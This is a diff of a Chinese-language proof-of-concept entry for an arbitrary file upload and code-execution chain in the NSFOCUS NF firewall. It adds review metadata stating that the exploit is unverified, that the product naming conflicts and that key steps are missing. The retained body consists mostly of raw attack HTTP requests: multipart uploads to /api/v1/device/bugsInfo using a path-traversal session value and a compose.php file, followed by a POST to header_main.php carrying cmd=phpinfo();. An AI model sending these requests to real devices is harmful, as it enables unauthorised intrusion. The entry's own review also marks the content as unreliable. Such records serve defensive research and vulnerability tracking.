@@ -1,8 +1,55 @@
 ---
 source: "Threekiii/Awesome-POC"
+id: "vw-a4f66059f82fe50688bf6f5d"
+entity_id: "ve-a4f66059f82fe50688bf6f5d"
+schema_version: "1"
+title: "绿盟 NF下一代防火墙 任意文件上传漏洞"
+product: "NSFOCUS NF防火墙，正文却称SSLVPN"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "8081接口可达，文件保存路径/session目录/PHP包含条件未说明"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F%20NF%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
+review_date: "2026-10-02"
+side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
+source_status: "unknown"
 ---
 
 # 绿盟 NF下一代防火墙 任意文件上传漏洞
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：NSFOCUS NF防火墙，正文却称SSLVPN
+- 本文讨论：bugsInfo上传会话/compose.php到header_main包含链
+- 版本、权限与配置前提：8081接口可达，文件保存路径/session目录/PHP包含条件未说明
+- 资料类型：文件上传+会话文件/包含RCE链；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 标题NF与影响SSLVPN产品冲突
+- compose.php上传请求重复两次；跨端口、上传目录、会话路径到lang包含的关键连接缺文字解释
+- 无型号/版本、鉴权和修复
+- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
+
+### 操作风险与恢复
+
+- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留
+
+### 待核与来源
+
+- 真实产品、临时目录、session加载和包含路径待源码/原研确认
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 ## 漏洞描述
 
@@ -26,7 +73,7 @@ app="NSFOCUS-下一代防火墙"
 
 出现漏洞的端口为 8081
 
-```
+```http
 POST /api/v1/device/bugsInfo HTTP/1.1
 Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9
 Host: 
@@ -41,7 +88,7 @@ lang|s:52:"../../../../../../../../../../../../../../../../tmp/";
 
 ![image-20230828162212745](./.resource/绿盟NF下一代防火墙任意文件上传漏洞/media/image-20230828162212745.png)
 
-```
+```http
 POST /api/v1/device/bugsInfo HTTP/1.1
 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
 Host: 
@@ -57,7 +104,7 @@ Content-Disposition: form-data; name="file"; filename="compose.php"
 
 ![image-20230828162224796](./.resource/绿盟NF下一代防火墙任意文件上传漏洞/media/image-20230828162224796.png)
 
-```
+```http
 POST /api/v1/device/bugsInfo HTTP/1.1
 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
 Host: 
@@ -73,10 +120,10 @@ Content-Disposition: form-data; name="file"; filename="compose.php"
 
 ![image-20230828162237233](./.resource/绿盟NF下一代防火墙任意文件上传漏洞/media/image-20230828162237233.png)
 
-```
+```http
 POST /mail/include/header_main.php HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
+Cookie: PHPSESSID_NF=82c**************************c71
 Host:
 
 cmd=phpinfo();
